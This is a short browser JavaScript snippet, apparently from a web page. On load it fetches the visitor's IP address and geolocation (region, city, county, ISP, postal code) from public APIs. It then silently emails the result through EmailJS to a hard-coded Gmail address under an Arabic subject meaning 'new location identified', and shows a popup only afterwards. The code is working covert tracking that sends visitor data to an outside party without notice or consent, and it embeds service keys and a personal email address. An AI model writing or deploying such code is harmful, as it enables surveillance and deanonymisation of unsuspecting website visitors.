emailjs.init("GRpOF1pKqcSg9cx5H");

window.onload = () => {
    fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => fetch(`https://ipapi.co/${data.ip}/json/`))
        .then(res => res.json())
        .then(loc => {
            const locationString = `${loc.region || '---'} - ${loc.city || '---'} - ${loc.county || '---'} - ${loc.org || '---'} - ${loc.postal || '---'}`;
            return emailjs.send("service_25q0ern", "template_xi6fmgy", {
                to_email: "e508769103@gmail.com",
                subject: "تم تحديد موقع جديد",
                message: `📍 موقع الزائر:\n${locationString}`
            });
        })
        .catch(console.error)
        .finally(() => {
            document.getElementById("popup").style.display = "block";
        });
};
